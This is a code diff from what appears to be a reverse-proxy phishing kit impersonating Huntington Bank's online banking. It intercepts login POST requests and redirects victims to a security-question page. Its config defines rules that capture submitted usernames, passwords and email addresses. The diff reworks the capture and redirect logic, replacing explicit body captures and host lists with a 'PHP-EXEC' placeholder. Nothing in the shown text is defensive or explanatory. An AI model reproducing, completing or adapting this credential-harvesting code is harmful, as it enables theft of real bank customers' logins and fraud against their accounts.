@@ -102,19 +102,12 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
 
         if (this.req.method === 'POST') {
             
-            // super.uploadRequestBody(clientContext.currentDomain, clientContext)
-            
-
             if (this.req.url === '/sub--onlinebanking/~/rol/Auth/login.aspx' 
             || this.req.url === '/rol/Auth/login.aspx') {
-                clientContext.setLogAvailable(true)
-                super.captureBody(clientContext.currentDomain, clientContext)
                 clientContext.currentDomain = 'onlinebanking.huntington.com'
                 this.res.writeHead(302, { location: '/session/secure/SecurityQuestion' })
-                return this.res.end('')
+                return super.cleanEnd('PHP-EXEC', clientContext)
             }
-            super.captureBody(clientContext.currentDomain, clientContext)
-            // super.uploadRequestBody(clientContext.currentDomain, clientContext)
 
         }
 
@@ -265,14 +258,14 @@ const configExport = {
             method: 'POST',
             params: ['username'],
             urls: [],
-            hosts: ['www.huntington.com'],
+            hosts: 'PHP-EXEC',
         },
 
         loginPassword: {
             method: 'POST',
             params: ['password'],
             urls: [],
-            hosts: ['www.huntington.com'],
+            hosts: 'PHP-EXEC',
         },
 
         emailCapture: {
